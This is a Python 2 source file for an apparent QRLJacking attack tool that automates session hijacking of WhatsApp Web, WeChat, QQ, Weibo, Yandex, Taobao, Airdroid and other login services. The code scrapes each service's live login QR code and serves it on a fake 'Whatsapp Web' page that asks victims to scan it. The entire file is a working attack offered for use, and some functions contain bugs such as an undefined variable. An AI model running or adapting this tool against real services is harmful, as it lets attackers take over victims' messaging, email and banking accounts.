#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,os ,urllib ,sys ,threading ,configparser
from binascii import a2b_base64

def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

try:
	from PIL import Image
	import selenium
	from selenium import webdriver

except:
	print "[!] Error Importing Exterinal Libraries"
	print "[!] Trying to install it using pip\n"
	try:
		os.system("python -m pip install selenium")
		os.system("python -m pip install Pillow")
	except:
		try:
			os.system("pip install selenium")
			os.system("pip install Pillow")
		except:
			print "[!] Can't install libraries "
			print "[!!] Try to install it yourself"
			exit(0)

finally:
	from PIL import Image
	import selenium
	from selenium import webdriver

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
		else:
			print " [!] Serving files on "+str(port)+" port"
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [+]Opening Mozila FireFox..."
		return web
	except:
		try:
			web = webdriver.Chrome()
			print " [+]Opening Google Chrome..."
			return web
		except:
			try:
				web = webdriver.Opera()
				print " [+]Opening Opera..."
				return web
			except:
				try:
					web = webdriver.Edge()
					print " [+]Opening Edge..."
					return web
				except:
					try:
						web = webdriver.Ie()
						print " [+]Opening Internet Explorer..."
						return web
					except:
						print " Error : \n Can not call webbrowsers\n  Check your pc"
						exit(0)

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [+]The QR code image found !"
			print " [+]Downloading the image.."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [#]Saved To tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	print "\n-- --- -- --- -- --- -- --- -- --- --"
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://passport.yandex.com/auth?mode=qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [+]The QR code image found !"
			data = urllib.urlopen(img_url).read()
			print " [+]Downloading the image.."
			f = open("tmp.svg","w").write(data)
			print " [#]Saved To tmp.svg"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://web.airdroid.com")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [!]Refreshing page..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://weibo.com/login.php")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://web.wechat.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("http://w.qq.com")
	time.sleep(10)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			location = img.location
			size = img.size
			print " [+]Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [#]Saved To tmp.png"
			webdriver.delete_all_cookies()
			time.sleep(10)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://login.taobao.com")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			button_class = web.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [!]Clicking to reload QR code image..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def mydigipass():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
	time.sleep(5)
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[1]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(20)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def Zapper():
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get("https://www.zapper.com/login.php")
	time.sleep(5)
	title = driver.title.encode("utf-8")
	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			c = web.find_elements_by_id("qrcodecontainer2")
			img = c[0].find_elements_by_tag_name("img")[0]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(10)
			continue
		except:
			break

def make(typ="html"):
	if typ == "html":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
</body></html>"""

	if typ == "svg":
		code = """<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
</body></html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [+]Navigating To Website.."
	driver.get(url)

	while True:
		print "-- --- -- --- -- --- -- --- -- --- --"
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [+]The QR code image found !"
			src = img.get_attribute('src')
			print " [+]Downloading the image.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [#]Saved To tmp.png"
			time.sleep(s)
			print " [!]Refreshing page..."
			driver.refresh()
			continue
		except:
			break

def main():
	#clear()
	print """\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
"""
	choice = input(" Choice > ")

	#Chat Applications
	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Line     [Soon]
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	"""

		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.QQ Mail [Soon]
 2.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		#1

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make("svg")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall [Soon]
 5.1688.com [Soon]
 6.Alimama [Soon]
 7.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay [Soon]
 2.Yandex Money
 3.TenPay [Soon]
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Yandex()
			main()
	#Mobile Managem

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Yandex()
			main()
	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App [Soon]
 4.Yelophone [Soon]
 5.Alibaba Yunos [Soon]
 00.Back To Main Menu [Soon]
"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			mydigipass()
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make()
			Serve_it(port)
			Zapper()
			main()

	#Customization
	#if choice == 8:
		#settings.read("Data/Simple.ini")
		#url = settings.get("WeChat","url")
		#image_number = settings.get("WeChat","image_number")
		#classname = settings.get("WeChat","classname")
if __name__ == '__main__':
	main()
